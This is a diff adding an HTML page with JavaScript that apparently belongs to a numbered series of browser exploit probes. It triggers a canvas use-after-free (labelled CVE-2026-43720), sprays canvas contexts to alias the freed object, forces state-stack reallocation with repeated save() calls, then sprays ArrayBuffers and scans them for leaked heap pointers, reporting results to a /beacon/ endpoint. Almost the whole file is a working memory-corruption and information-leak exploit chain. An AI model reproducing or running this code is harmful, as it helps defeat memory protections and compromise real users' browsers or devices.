@@ -1,0 +1,198 @@
+<!--
+  p594: Canvas UAF state stack reallocation info leak.
+
+  Hypothesis: save() grows Vector<State> → old buffer freed to regular heap.
+  Freed buffer contains State structs with internal pointers (lineDash Vector
+  m_buffer, font objects, etc.). Reclaim with ArrayBuffer → read pointer bytes.
+
+  Also tests: after many save()/restore() cycles, does the state stack buffer
+  get reallocated? Can we detect the reallocation via timing or allocation
+  patterns?
+
+  Chain: p593 trigger (CVE-2026-43720) → same-type reclaim → aliased save() ×N
+  → grow state stack → old buffer freed → ArrayBuffer reclaim → scan for ptrs.
+
+  Float32 DAZ note: heap pointer 0x00000010_XXXXXXXX as two float32s:
+    lo = 0xXXXXXXXX (normalized float, readable)
+    hi = 0x00000010 (denormal → 0.0 with DAZ)
+  We know hi=0x10 from prior measurements, so lo is enough.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p594</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function triggerUAF() {
+  var c = document.createElement('canvas');
+  c.width = 64; c.height = 64;
+  var inner = null;
+  var settings = {};
+  Object.defineProperty(settings, 'desynchronized', {
+    get: function() { if (!inner) inner = c.getContext('2d'); return false; },
+    enumerable: true, configurable: true
+  });
+  var outer = c.getContext('2d', settings);
+  if (!inner || inner === outer) return null;
+  return inner;
+}
+
+function reclaimCanvas(count) {
+  var ctxs = [];
+  for (var i = 0; i < count; i++) {
+    var cv = document.createElement('canvas');
+    cv.width = 64; cv.height = 64;
+    var ctx = cv.getContext('2d');
+    if (ctx) { ctx.lineWidth = 1; ctxs.push(ctx); }
+  }
+  return ctxs;
+}
+
+function findAlias(inner, ctxs) {
+  try { inner.lineWidth = 77.77; } catch(e) { return -1; }
+  for (var i = 0; i < ctxs.length; i++) {
+    try { if (ctxs[i].lineWidth === 77.77) return i; } catch(e) {}
+  }
+  return -1;
+}
+
+function scanBuf(buf, tag) {
+  var u8 = new Uint8Array(buf);
+  var u32 = new Uint32Array(buf);
+  var nz = 0, ptrs = [];
+
+  for (var i = 0; i < u32.length - 1; i += 2) {
+    var lo = u32[i], hi = u32[i+1];
+    if (lo !== 0 || hi !== 0) nz++;
+    // Heap pointer pattern: hi = 0x00000010, lo in range 0x00800000..0x0FFFFFFF
+    if (hi === 0x10 && lo >= 0x00800000 && lo <= 0x0FFFFFFF) {
+      var addr = '00000010' + ('00000000' + lo.toString(16)).slice(-8);
+      ptrs.push(i + ':' + addr);
+    }
+    // Also check hi = 0x00000053 (eboot range)
+    if ((hi & 0xFFFFFF00) === 0x00000500 && lo !== 0) {
+      var addr2 = ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8);
+      ptrs.push(i + ':' + addr2 + '*');
+    }
+  }
+
+  b(tag + 'NZ=' + nz + ',LEN=' + u32.length + ',PTRS=' + ptrs.length);
+  if (ptrs.length > 0) {
+    for (var j = 0; j < Math.min(ptrs.length, 20); j += 4) {
+      b(tag + 'P=' + ptrs.slice(j, j+4).join('|'));
+    }
+  }
+  return ptrs.length;
+}
+
+function main(){
+b('G');
+
+// Phase 1: trigger + reclaim
+var inner = triggerUAF();
+if (!inner) { b('FAIL-UAF'); return; }
+b('UAF-OK');
+
+var ctxs = reclaimCanvas(500);
+b('SPRAY=' + ctxs.length);
+
+var aliasIdx = findAlias(inner, ctxs);
+if (aliasIdx < 0) { b('FAIL-ALIAS'); return; }
+b('ALIAS=' + aliasIdx);
+
+// Phase 2: Set distinctive state properties before save
+try {
+  inner.lineWidth = 123.456;
+  inner.globalAlpha = 0.789;
+  inner.miterLimit = 999.111;
+  inner.shadowBlur = 55.55;
+  inner.setLineDash([11.5, 22.5, 33.5, 44.5]);
+  inner.font = '48px monospace';
+  inner.shadowColor = '#AABBCC';
+  inner.setTransform(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
+  b('STATE-SET');
+} catch(e) { b('STATE-ERR=' + e.message); }
+
+// Phase 3: Grow state stack via many save() calls
+// Vector<State> initial capacity is likely 0 or small.
+// Each save() pushes a copy of the full state.
+// At capacity, Vector doubles and frees old buffer.
+var saveCount = 0;
+try {
+  for (var i = 0; i < 64; i++) {
+    inner.save();
+    saveCount++;
+  }
+  b('SAVED=' + saveCount);
+} catch(e) { b('SAVE-ERR=' + e.message + ',count=' + saveCount); }
+
+// Phase 4: Allocate ArrayBuffers of various sizes to reclaim freed Vector buffers
+// State size is unknown — try multiple sizes.
+// Likely range: 128-512 bytes per State.
+// With initial capacity growing: 1→2→4→8→16→32→64
+// The freed buffers are: 1×S, 2×S, 4×S, 8×S, 16×S, 32×S bytes
+// where S is the State struct size.
+
+var sizes = [64, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048, 3072, 4096,
+             6144, 8192, 12288, 16384, 24576, 32768, 49152, 65536];
+var bufs = [];
+var totalPtrs = 0;
+
+for (var s = 0; s < sizes.length; s++) {
+  var batch = [];
+  // Spray 32 ArrayBuffers of each size
+  for (var j = 0; j < 32; j++) {
+    try {
+      var ab = new ArrayBuffer(sizes[s]);
+      batch.push(ab);
+    } catch(e) {}
+  }
+  bufs.push(batch);
+}
+b('BUFS=' + bufs.length + 'sizes');
+
+// Phase 5: Scan all ArrayBuffers for pointer patterns
+for (var s = 0; s < bufs.length; s++) {
+  var found = 0;
+  for (var j = 0; j < bufs[s].length; j++) {
+    found += scanBuf(bufs[s][j], 'S' + sizes[s] + 'B' + j + ':');
+    if (found > 0) break; // stop scanning this size after first hit
+  }
+  if (found > 0) {
+    totalPtrs += found;
+    b('HIT-SIZE=' + sizes[s] + ',found=' + found);
+  }
+}
+
+b('TOTAL-PTRS=' + totalPtrs);
+
+// Phase 6: Also try reading lineDash from alias after restore
+// If the state stack was corrupted, restore might give us garbage
+try {
+  for (var i = 0; i < saveCount; i++) inner.restore();
+  var dash = inner.getLineDash();
+  var lw = inner.lineWidth;
+  var ga = inner.globalAlpha;
+  b('RESTORED:lw=' + lw + ',ga=' + ga + ',dash=' + (dash ? dash.join(',') : 'null'));
+} catch(e) { b('RESTORE-ERR=' + e.message); }
+
+// Phase 7: Scan for non-zero in freshly allocated ArrayBuffers (baseline)
+// This tells us if the allocator zeroes memory
+var baseline = new ArrayBuffer(4096);
+var bU32 = new Uint32Array(baseline);
+var baseNZ = 0;
+for (var i = 0; i < bU32.length; i++) { if (bU32[i] !== 0) baseNZ++; }
+b('BASELINE-4K-NZ=' + baseNZ);
+
+var baseline2 = new ArrayBuffer(16384);
+var b2U32 = new Uint32Array(baseline2);
+var base2NZ = 0;
+for (var i = 0; i < b2U32.length; i++) { if (b2U32[i] !== 0) base2NZ++; }
+b('BASELINE-16K-NZ=' + base2NZ);
+
+b('ALIVE');
+}
+
+setTimeout(main, 50);
+setTimeout(function(){ b('ALIVE2'); }, 15000);
+</script></head><body>p594</body></html>
